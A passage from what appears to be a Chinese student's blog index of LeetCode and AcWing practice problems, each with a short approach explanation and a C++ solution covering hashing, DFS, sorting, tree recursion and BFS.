两个列表的最小索引总和</a></h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>利用哈希表存储后进行字符串索引查找，同时通过<code>map</code>记录每个哈希值的索引数值大小</p><h2 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">findRestaurant</span><span class="hljs-params">(vector&lt;string&gt;&amp; list1, vector&lt;string&gt;&amp; list2)</span> </span>&#123;<br>        unordered_map&lt;string, <span class="hljs-type">int</span>&gt; hash;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list1.<span class="hljs-built_in">size</span>();i++)<br>            hash[list1[i]] = i;<br>        <span class="hljs-type">int</span> sum = INT_MAX;<br>        vector&lt;string&gt; res;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list2.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            string&amp; s = list2[i];<br>            <span class="hljs-keyword">if</span>(hash.<span class="hljs-built_in">count</span>(s))<br>            &#123;<br>                <span class="hljs-type">int</span> k = hash[s] + i;<br>                <span class="hljs-keyword">if</span>(k &lt; sum)<br>                &#123;<br>                    sum = k;<br>                    res = &#123;s&#125;;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(k==sum)<br>                &#123;<br>                    res.<span class="hljs-built_in">push_back</span>(s);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="2044-统计按位或能得到最大值的子集数目-力扣（LeetCode）-leetcode-cn-com"><a href="#2044-统计按位或能得到最大值的子集数目-力扣（LeetCode）-leetcode-cn-com" class="headerlink" title="2044. 统计按位或能得到最大值的子集数目 - 力扣（LeetCode） (leetcode-cn.com)"></a><a href="https://leetcode-cn.com/problems/count-number-of-maximum-bitwise-or-subsets/">2044. 统计按位或能得到最大值的子集数目 - 力扣（LeetCode） (leetcode-cn.com)</a></h1><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>爆搜思路，对于任意一位 xx 而言，都有选和不选两种选择，分别对应了<code>dfs(u + 1, val | nums[x])</code>和<code>dfs(u + 1, val)</code>两条搜索路径，在搜索所有状态过程中，使用全局变量<code>max</code>和<code>ans</code>来记录最大得分以及取得最大得分的状态数量。</p><h2 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; nums;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>, max=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countMaxOrSubsets</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; _nums)</span> </span>&#123;<br>        nums = _nums;<br>        <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> val)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(u == nums.<span class="hljs-built_in">size</span>())<br>        &#123;<br>            <span class="hljs-keyword">if</span>(val &gt; max)   <br>            &#123;<br>                max = val;<br>                ans = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(val == max) ans++;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>, val | nums[u]);<br>        <span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>, val);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="720-词典中最长的单词-力扣（LeetCode）-leetcode-cn-com"><a href="#720-词典中最长的单词-力扣（LeetCode）-leetcode-cn-com" class="headerlink" title="720. 词典中最长的单词 - 力扣（LeetCode） (leetcode-cn.com)"></a><a href="https://leetcode-cn.com/problems/longest-word-in-dictionary/">720. 词典中最长的单词 - 力扣（LeetCode） (leetcode-cn.com)</a></h1><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>先将输入的<code>words</code>进行排序，规则为先按长度升序排序，在长度相同情况下再按照字典序降序排序，这样就可以保证我们在后面遍历每个单词时，比该单词短的全部<del>子单词</del>已全部遍历过，且每次遇到符合要求的单词一定是最长且字典序最小的单词，可以直接将其更新为答案。</p><h2 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">longestWord</span><span class="hljs-params">(vector&lt;string&gt;&amp; words)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(words.<span class="hljs-built_in">begin</span>(), words.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> string &amp;a, <span class="hljs-type">const</span> string &amp;b)&#123;<br>            <span class="hljs-keyword">return</span> a.<span class="hljs-built_in">size</span>()!=b.<span class="hljs-built_in">size</span>()?a.<span class="hljs-built_in">size</span>()&lt;b.<span class="hljs-built_in">size</span>():a&gt;b;<br>        &#125;);<br>        string longest;<br>        unordered_set&lt;string&gt; candidates = &#123;<span class="hljs-string">&quot;&quot;</span>&#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;word : words)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(candidates.<span class="hljs-built_in">count</span>(word.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, word.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>)))<br>            &#123;<br>                longest = word;<br>                candidates.<span class="hljs-built_in">emplace</span>(word);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> longest;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="AcWing-606-根据二叉树创建字符串"><a href="#AcWing-606-根据二叉树创建字符串" class="headerlink" title="AcWing 606. 根据二叉树创建字符串"></a><a href="https://leetcode-cn.com/problems/construct-string-from-binary-tree/">AcWing 606. 根据二叉树创建字符串</a></h1><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><p>递归方式遍历，如果确实存在左儿子右儿子则带上括号递归，如果不存在则直接返回当前节点数值即可，思路很简单</p><h2 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">tree2str</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">nullptr</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(root-&gt;val);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;right == <span class="hljs-literal">nullptr</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(root-&gt;val) + <span class="hljs-string">&quot;(&quot;</span> + <span class="hljs-built_in">tree2str</span>(root-&gt;left) + <span class="hljs-string">&quot;)&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(root-&gt;val) + <span class="hljs-string">&quot;(&quot;</span> + <span class="hljs-built_in">tree2str</span>(root-&gt;left) + <span class="hljs-string">&quot;)(&quot;</span>+ <span class="hljs-built_in">tree2str</span>(root-&gt;right) + <span class="hljs-string">&quot;)&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="2039-网络空闲的时刻-力扣（LeetCode）-leetcode-cn-com"><a href="#2039-网络空闲的时刻-力扣（LeetCode）-leetcode-cn-com" class="headerlink" title="2039. 网络空闲的时刻 - 力扣（LeetCode） (leetcode-cn.com)"></a><a href="https://leetcode-cn.com/problems/the-time-when-the-network-becomes-idle/">2039. 网络空闲的时刻 - 力扣（LeetCode） (leetcode-cn.com)</a></h1><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><p>可以将整个计算机网络视为一个无向图，服务器就是图中的节点，根据图中的边对应关系即可求出任意节点之间的距离，利用BFS先求出节点0到其他节点的最短距离，然后依次求出每个节点变为空闲的时间，当所有节点都变为空闲时，整个网络即变为空闲状态，因此网络的最早空闲时间即为各个节点中最晚的空闲时间。</p><p>设节点v与节点0之间最短距离位dist，则此时当节点v接收到主服务器节点0的最后一个回复后的下一秒，节点v变为空闲状态。节点v发送一个消息经过dist秒到达节点0，节点0回复消息并由节点v接收，因此节点v每发送一次消息后，经过$2 \times dist$秒才能收到回复，由于节点v会周期性每<code>patience[v]</code>秒发送一次消息，因此需要分以下两种情况进行讨论：</p><ul><li>当$2 \times dist \leq patience[v]$时，则此时节点v还未开始发送第二次消息就已收到回复，因此节点v只会发送一次消息，此时节点v变为空闲时间为$2 \times dist+1$</li><li>当$2\times dist&gt;patience[v]$时，此时节点在等待第一次回复时就会开始重新发送消息，可知在$[1, 2\times dist)$时间范围内最多再次发送$\frac{2\times dist-1}{patience[i]}$次消息，最后一次发送消息的时间为$patience[v]\times \frac{2\times dist-1}{patience[v]}$，而节点每发送一次消息就会经过$2\times dist[v]$收到回复，因此节点v最后一次收到回复的时间为$patience[v]\times \frac{2\times dist-1}{patience[v]}+2\times dist$，则此时可知节点v变空闲时间为$patience[v]\times \frac{2\times dist-1}{patience[v]}+2\times dist+1$</li></ul><p>当$2 \times dist \leq patience[v]$时，$\frac{2\times dist-1}{patience[v]}&#x3D;0$，因此以上两种情况可以进行合并。</p><h2 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">networkBecomesIdle</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; edges, vector&lt;<span class="hljs-type">int</span>&gt;&amp; patience)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = patience.<span class="hljs-built_in">size</span>();<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">adj</span>(n);<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">visit</span><span class="hljs-params">(n, <span class="hljs-literal">false</span>)</span></span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;v: edges)<br>        &#123;<br>            adj[v[<span class="hljs-number">0</span>]].<span class="hljs-built_in">emplace_back</span>(v[<span class="hljs-number">1</span>]);<br>            adj[v[<span class="hljs-number">1</span>]].<span class="hljs-built_in">emplace_back</span>(v[<span class="hljs-number">0</span>]);<br>        &#125;<br>        <span class="hljs-comment">//BFS</span><br>        queue&lt;<span class="hljs-type">int</span>&gt; qu;<br>        qu.<span class="hljs-built_in">emplace</span>(<span class="hljs-number">0</span>);<br>        visit[<span class="hljs-number">0</span>]=<span class="hljs-literal">true</span>;<br>        <span class="hljs-type">int</span> dist = <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(!qu.<span class="hljs-built_in">empty</span>())&#123;<br>            <span class="hljs-type">int</span> sz = qu.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;sz;i++)<br>            &#123;<br>                <span class="hljs-type">int</span> curr = qu.<span class="hljs-built_in">front</span>();<br>                qu.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;v : adj[curr])&#123;<br>                    <span class="hljs-keyword">if</span>(visit[v])    <span class="hljs-keyword">continue</span>;<br>                    qu.<span class="hljs-built_in">emplace</span>(v);<br>                    <span class="hljs-type">int</span> time = patience[v] * ((<span class="hljs-number">2</span> * dist - <span class="hljs-number">1</span>) / patience[v]) + <span class="hljs-number">2</span>*dist + <span class="hljs-number">1</span>;<br>                    ans = <span class="hljs-built_in">max</span>(ans, time);<br>                    visit[v]=<span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>            dist++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【寒假学习计划】 - 算法刷题记录</title>
      <link href="/2022/01/20a3212b.html"/>
      <url>/2022/01/20a3212b.html</url>
      
        <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>假期学习计划本来是很早之前就有的，但是之前的都没有更新在博客上，后来想如果每天给所学内容做一个总结，一来督促自己学习，二来方便自己查阅，所以之后会把前面的刷题记录慢慢补上，之后每天的都在这做记录。</p><h1 id="2022-01"><a href="#2022-01" class="headerlink" title="2022.01"></a>2022.01</h1><h2 id="AcWing-1813-方块游戏"><a href="#AcWing-1813-方块游戏" class="headerlink" title="AcWing 1813. 方块游戏"></a><a href="https://www.acwing.com/problem/content/1815/">AcWing 1813. 方块游戏</a></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>枚举，题目说明不管哪一面向上都可以，所以就两面加起来取各个字母的最大值，最后N对字母的最大值相加就是答案</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ans</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span></span>;<br>    cin&gt;&gt;n;<br>    string s1,s2;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        cin&gt;&gt;s1&gt;&gt;s2;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span>, <span class="hljs-title">c2</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span></span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c: s1) c1[c-<span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c: s2) c2[c-<span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">26</span>;j++)<br>            ans[j] += <span class="hljs-built_in">max</span>(c1[j], c2[j]);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++)<br>        cout&lt;&lt;ans[i]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1801-蹄子剪刀布"><a href="#AcWing-1801-蹄子剪刀布" class="headerlink" title="AcWing 1801. 蹄子剪刀布"></a><a href="https://www.acwing.com/problem/content/1791/">AcWing 1801. 蹄子剪刀布</a></h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>枚举，根据题目叙述可知，相邻两个手势之间具有胜负关系，所以我们只需要将三个手势分别编号为0,1,2（原输入编号为1-3，需要进行处理），所以可以通过<code>(x+1)%3</code>获得x的下一个相邻手势，然后用两个ans分别记录两种情况下的胜负关系，然后输出较大值即可</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-type">int</span> ans1=<span class="hljs-number">0</span>, ans2=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> x,y;<br>        cin&gt;&gt;x&gt;&gt;y;<br>        x--;<br>        y--;<br>        <span class="hljs-keyword">if</span>((x+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>==y)  ans1++;<br>        <span class="hljs-keyword">if</span>(x==(y+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>)  ans2++;<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-built_in">max</span>(ans1, ans2)&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2022-02"><a href="#2022-02" class="headerlink" title="2022.02"></a>2022.02</h1><h2 id="AcWing-1789-牛为什么过马路II"><a href="#AcWing-1789-牛为什么过马路II" class="headerlink" title="AcWing 1789. 牛为什么过马路II"></a><a href="acwing.com/problem/content/1791/">AcWing 1789. 牛为什么过马路II</a></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>枚举26个字母，计算字母之间只出现一次的字母，这里借鉴大佬的思路，可以使用位运算，出现一次就是1，其余即为0，最后使用<code>bitset.count()</code>函数返回1的个数</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string s;<br>    cin&gt;&gt;s;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++)<br>    &#123;<br>        bitset&lt;32&gt; bits;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c:s)<br>        &#123;<br>            bits[c-<span class="hljs-string">&#x27;A&#x27;</span>]=bits[c-<span class="hljs-string">&#x27;A&#x27;</span>]^<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(c-<span class="hljs-string">&#x27;A&#x27;</span>==i &amp;&amp; bits[i]==<span class="hljs-number">1</span>)<br>            &#123;<br>                bits=<span class="hljs-number">0</span>;<br>                bits[i]=<span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(c-<span class="hljs-string">&#x27;A&#x27;</span>==i &amp;&amp; bits[i]==<span class="hljs-number">0</span>)<br>            &#123;<br>                ans+=bits.<span class="hljs-built_in">count</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;ans/<span class="hljs-number">2</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1776-牛的基因组学"><a href="#AcWing-1776-牛的基因组学" class="headerlink" title="AcWing 1776. 牛的基因组学"></a><a href="https://www.acwing.com/problem/content/description/1778/">AcWing 1776. 牛的基因组学</a></h2><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>依旧是枚举的思路，按照每个位置依次进行枚举。每次枚举的时候，首先把有斑点的牛都遍历一遍，把所有出现过的基因都记录为一个库序列；其次再对没有斑点的奶牛进行遍历，如果出现了在有斑点的基因库序列中没有的基因，则退出循环（条件不成立），如果第二个循环正常退出，则说明符合条件，累加结果即可。</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n,m,ans;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">110</span>;<br><br><br>string s1[MAXN],s2[MAXN];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)   cin&gt;&gt;s1[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)   cin&gt;&gt;s2[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> flag[<span class="hljs-number">30</span>], x=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(flag));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span 